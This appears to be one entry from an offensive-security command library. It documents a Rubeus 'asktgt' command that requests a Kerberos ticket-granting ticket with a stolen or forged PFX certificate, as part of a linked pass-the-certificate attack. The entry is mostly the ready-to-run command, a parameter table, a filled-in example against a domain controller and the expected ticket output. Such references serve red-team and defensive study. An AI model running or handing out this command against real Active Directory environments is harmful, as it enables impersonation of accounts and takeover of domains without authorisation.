---
id: de4b86c9-d0ff-4da2-89e8-ed2659804205
name: rubeus-asktgt-certificate
type: command
executor: powershell
data: >-
  Rubeus.exe asktgt /user:$_TARGET_USER /certificate:$_CERT_PFX
  /password:$_CERT_PASSWORD /domain:$_DOMAIN /dc:$_DC_HOST /show
output: null
created_at: '2023-04-06T03:56:06.176481+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - kerberos
  - rubeus
  - tgt
verified: true
validated: true
---

# rubeus-asktgt-certificate

## Command

```powershell
Rubeus.exe asktgt /user:$_TARGET_USER /certificate:$_CERT_PFX /password:$_CERT_PASSWORD /domain:$_DOMAIN /dc:$_DC_HOST /show
```

## Description

Uses Rubeus to request a TGT via certificate-based PKINIT authentication on Windows.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| /user | Target username | Yes |
| /certificate | PFX certificate path | Yes |
| /password | Certificate password | Yes |
| /domain | FQDN domain | Yes |
| /dc | Domain controller | Yes |
| /show | Display ticket details | No |

## Examples

### Basic Usage

```powershell
Rubeus.exe asktgt /user:admin /certificate:cert.pfx /password:Pass123 /domain:domain.local /dc:dc01 /show
```

## Expected Output

[*] Action: Ask TGT
[*] User: admin@domain.local
[TGT] Base64 ticket: <encoded ticket>

## Related

- [[procedures/Pass-The-Certificate-Attack]]
